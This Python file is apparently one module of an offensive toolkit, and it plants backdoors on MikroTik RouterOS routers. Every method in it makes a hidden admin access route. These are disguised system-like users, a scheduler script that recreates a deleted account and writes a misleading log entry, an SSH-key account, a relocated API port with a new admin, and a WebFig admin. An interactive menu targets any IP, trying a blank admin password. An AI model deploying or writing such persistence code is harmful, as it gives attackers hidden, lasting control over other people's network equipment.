#!/usr/bin/env python3
# PHZ//VOID - Module 5: Backdoor & Persistence
# Advanced Backdoor & Persistence for MikroTik RouterOS

import secrets
import string
import time
from typing import Dict, List, Optional
from datetime import datetime
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import HackerStyle, Logger
from lib.mikrotik_api import MikrotikAPI


class BackdoorModule:
    """
    Backdoor & Persistence Module untuk MikroTik RouterOS
    Support multiple persistence techniques with stealth features.
    """

    def __init__(self, api: MikrotikAPI):
        self.api = api
        self.logger = Logger("Backdoor")
        self.created_backdoors: List[Dict] = []

    def _generate_password(self, length: int = 16) -> str:
        """Generate strong random password"""
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(secrets.choice(alphabet) for _ in range(length))

    def _generate_obscure_username(self) -> str:
        """Generate system-like hidden username"""
        prefixes = ['sys', 'internal', 'service', 'net', 'kernel', 'backup', 'sync']
        return f".{secrets.choice(prefixes)}{secrets.token_hex(3)}"

    # ====================== CORE BACKDOOR METHODS ======================

    def create_hidden_user(self, username: str = None, password: str = None, 
                          group: str = "full") -> Dict:
        """Create hidden/system-like user"""
        if not username:
            username = self._generate_obscure_username()
        if not password:
            password = self._generate_password()

        backdoor = {
            'type': 'hidden_user',
            'username': username,
            'password': password,
            'group': group,
            'created': datetime.now().isoformat()
        }

        try:
            # Check if user exists
            existing = self.api.execute('/user/print', name=username)
            if existing:
                HackerStyle.warning(f"User '{username}' already exists")
                backdoor['status'] = 'exists'
                return backdoor

            # Create user
            self.api.execute('/user/add', name=username, password=password, group=group)
            self.api.execute('/user/set', name=username, comment="System service account")

            HackerStyle.success(f"✅ Hidden user created → {username}:{password}")
            backdoor['status'] = 'success'
            self.created_backdoors.append(backdoor)

        except Exception as e:
            HackerStyle.error(f"Failed to create hidden user: {e}")
            backdoor['status'] = 'failed'
        
        return backdoor

    def create_scheduled_backdoor(self, username: str = None, password: str = None, 
                                 interval: str = "30m") -> Dict:
        """Persistence via Scheduler (Auto restore if deleted)"""
        if not username:
            username = self._generate_obscure_username()
        if not password:
            password = self._generate_password()

        script_name = f"syschk_{secrets.token_hex(4)}"

        script_source = f"""
:local u "{username}"
:local p "{password}"
:if ([:len [/user find name=\$u]] = 0) do={{
    /user add name=\$u password=\$p group=full comment="System service"
    /log warning "System maintenance: service account restored"
}}
"""

        backdoor = {
            'type': 'scheduled',
            'username': username,
            'password': password,
            'interval': interval,
            'script_name': script_name,
            'created': datetime.now().isoformat()
        }

        try:
            self.api.execute('/system/script/add', name=script_name, source=script_source)
            self.api.execute('/system/scheduler/add', 
                           name=script_name, 
                           interval=interval, 
                           on_event=script_name)

            HackerStyle.success(f"✅ Scheduled persistence created (every {interval})")
            backdoor['status'] = 'success'
            self.created_backdoors.append(backdoor)

        except Exception as e:
            HackerStyle.error(f"Scheduler backdoor failed: {e}")
            backdoor['status'] = 'failed'

        return backdoor

    def create_ssh_key_backdoor(self, public_key: str = None) -> Dict:
        """SSH Key-based passwordless backdoor"""
        if not public_key:
            HackerStyle.warning("Please paste your SSH public key:")
            public_key = input(f"{HackerStyle.CYAN}[>] {HackerStyle.RESET}").strip()

        if not public_key.startswith("ssh-"):
            HackerStyle.error("Invalid SSH public key")
            return {'status': 'failed'}

        username = "sshadmin"

        backdoor = {
            'type': 'ssh_key',
            'username': username,
            'public_key': public_key[:50] + "...",
            'created': datetime.now().isoformat()
        }

        try:
            self.api.execute('/user/add', name=username, group="full")
            self.api.execute('/user/ssh-keys/add', user=username, key=public_key)
            
            HackerStyle.success(f"✅ SSH Key backdoor created for user: {username}")
            backdoor['status'] = 'success'
            self.created_backdoors.append(backdoor)

        except Exception as e:
            HackerStyle.error(f"SSH Key backdoor failed: {e}")
            backdoor['status'] = 'failed'

        return backdoor

    def create_api_backdoor(self, port: int = 9728) -> Dict:
        """Custom port API backdoor"""
        username = "apiuser"
        password = self._generate_password()

        backdoor = {
            'type': 'api_port',
            'port': port,
            'username': username,
            'password': password,
            'created': datetime.now().isoformat()
        }

        try:
            self.api.execute('/ip/service/set', name="api", port=port, disabled="no")
            self.api.execute('/user/add', name=username, password=password, group="full")

            HackerStyle.success(f"✅ API Backdoor active on port {port}")
            HackerStyle.info(f"   → {username}:{password}")
            backdoor['status'] = 'success'
            self.created_backdoors.append(backdoor)

        except Exception as e:
            HackerStyle.error(f"API backdoor failed: {e}")
            backdoor['status'] = 'failed'

        return backdoor

    def create_webfig_backdoor(self) -> Dict:
        """WebFig / HTTPS Backdoor"""
        username = "webadmin"
        password = self._generate_password()

        backdoor = {
            'type': 'webfig',
            'username': username,
            'password': password,
            'url': f"https://{self.api.host}",
            'created': datetime.now().isoformat()
        }

        try:
            self.api.execute('/ip/service/enable', name="www-ssl")
            self.api.execute('/ip/service/set', name="www-ssl", port=443, disabled="no")
            self.api.execute('/user/add', name=username, password=password, group="full")

            HackerStyle.success(f"✅ WebFig backdoor created")
            HackerStyle.info(f"   → https://{self.api.host} | {username}:{password}")
            backdoor['status'] = 'success'
            self.created_backdoors.append(backdoor)

        except Exception as e:
            HackerStyle.error(f"WebFig backdoor failed: {e}")
            backdoor['status'] = 'failed'

        return backdoor

    def create_all(self):
        """Create multiple layers of persistence"""
        HackerStyle.warning("Deploying multi-layer persistence...")

        self.create_hidden_user()
        self.create_scheduled_backdoor()
        self.create_api_backdoor()
        self.create_webfig_backdoor()

        HackerStyle.success(f"Total backdoors created: {len(self.created_backdoors)}")

    def list_backdoors(self):
        """Display all created backdoors"""
        if not self.created_backdoors:
            HackerStyle.info("No backdoors created yet.")
            return

        HackerStyle.print_separator("═", 60)
        print(f"     {HackerStyle.RED}ACTIVE BACKDOORS{ HackerStyle.RESET}")
        HackerStyle.print_separator("═", 60)

        for i, bd in enumerate(self.created_backdoors):
            print(f"  {i+1:2d}. {bd['type'].upper():15} | {bd.get('username', 'N/A')}")
        HackerStyle.print_separator("═", 60)

    def menu(self):
        """Interactive Backdoor Menu"""
        while True:
            HackerStyle.print_separator("═", 65)
            print(f"     {HackerStyle.RED}BACKDOOR & PERSISTENCE MODULE{ HackerStyle.RESET} - {self.api.host}")
            HackerStyle.print_separator("═", 65)

            print("   1. Hidden User")
            print("   2. Scheduled Persistence")
            print("   3. SSH Key Backdoor")
            print("   4. API Custom Port")
            print("   5. WebFig Backdoor")
            print("   6. Create ALL Layers")
            print("   7. List Backdoors")
            print("   8. Back to Main Menu")

            choice = input(f"\n{HackerStyle.CYAN}[?] Choose: {HackerStyle.RESET}").strip()

            if choice == "1":
                self.create_hidden_user()
            elif choice == "2":
                self.create_scheduled_backdoor()
            elif choice == "3":
                self.create_ssh_key_backdoor()
            elif choice == "4":
                port = int(input("[?] Custom API Port [9728]: ") or 9728)
                self.create_api_backdoor(port)
            elif choice == "5":
                self.create_webfig_backdoor()
            elif choice == "6":
                self.create_all()
            elif choice == "7":
                self.list_backdoors()
            elif choice == "8":
                break
            else:
                HackerStyle.error("Invalid option!")

            time.sleep(0.5)


# ==================== STANDALONE TEST ====================
if __name__ == "__main__":
    HackerStyle.banner()
    target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET).strip()
    
    # Contoh penggunaan (pastikan sudah login)
    api = MikrotikAPI(target, port=8728)
    if api.login("admin", ""):   # ganti password sesuai
        backdoor = BackdoorModule(api)
        backdoor.menu()
    else:
        HackerStyle.error("Login failed!")